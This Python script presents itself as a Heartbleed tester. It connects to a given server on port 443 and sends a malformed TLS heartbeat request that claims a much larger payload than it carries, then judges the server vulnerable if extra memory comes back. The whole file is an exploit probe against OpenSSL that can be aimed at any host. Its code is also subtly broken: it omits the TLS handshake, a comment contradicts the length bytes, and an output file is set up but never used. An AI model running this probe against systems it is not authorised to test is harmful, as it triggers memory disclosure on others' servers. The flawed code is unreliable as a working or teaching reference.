import sys
import struct
import socket
import time
import select
import codecs
from optparse import OptionParser

# Decoder for hexadecimal encoding
decode_hex = codecs.getdecoder('hex_codec')

options = OptionParser(description='Test for Heartbleed vulnerability by sending a Heartbeat request')

def hex_to_bin(hex_string):
    """Convert a hex string to binary data"""
    return decode_hex(hex_string.replace(' ', '').replace('\n', ''))[0]

# Heartbeat request (without SSL/TLS handshake)
# 18 - heartbeat , 03 02 - protocol version (not relevant), 00 03 - length , 01 - message type , 40 00 - payload
HEARTBEAT_REQUEST_HEX = (
    "18 03 02 00 10"  # Header
    "01 40 00"        # Message type and payload
)

heartbeat_request = hex_to_bin(HEARTBEAT_REQUEST_HEX)

def receive_from_socket(sock, length, timeout=5):
    """Receive the specified length of data from the socket"""
    end_time = time.time() + timeout
    received_data = b''
    while len(received_data) < length:
        remaining_time = end_time - time.time()
        if remaining_time <= 0:
            return None
        ready = select.select([sock], [], [], remaining_time)
        if sock in ready[0]:
            data = sock.recv(length - len(received_data))
            if not data:
                return None
            received_data += data
    return received_data

def receive_message(sock):
    """Receive a message from the server"""
    header = receive_from_socket(sock, 5)
    if not header:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None

    message_type, version, length = struct.unpack('>BHH', header)
    payload = receive_from_socket(sock, length, 10)
    if not payload:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None

    print(f'... received message: type = {message_type}, length = {len(payload)}')
    return message_type, version, payload

def send_heartbeat(sock, output_file):
    """Send a heartbeat request and check for vulnerability"""
    sock.send(heartbeat_request)
    while True:
        message_type, version, payload = receive_message(sock)
        if message_type is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False
        if message_type == 24:
            print('Received heartbeat response:')
            if len(payload) > 3:
                print('Heartbeat response contained extra data')
                print('Server is vulnerable to heartbleed!')
            else:
                print('Heartbeat response did not return any extra data.')
                print('Server is not vulnerable to heartbleed.')
            return True
        if message_type == 21:
            print('Received alert:')
            print('Server returned error, likely not vulnerable')
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    server = args[0]
    port = 443
    output_file = "heartbeat_response.txt"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print('Connecting...')
        sock.connect((server, port))

        print('Sending heartbeat request...')
        send_heartbeat(sock, output_file)

if __name__ == '__main__':
    main()
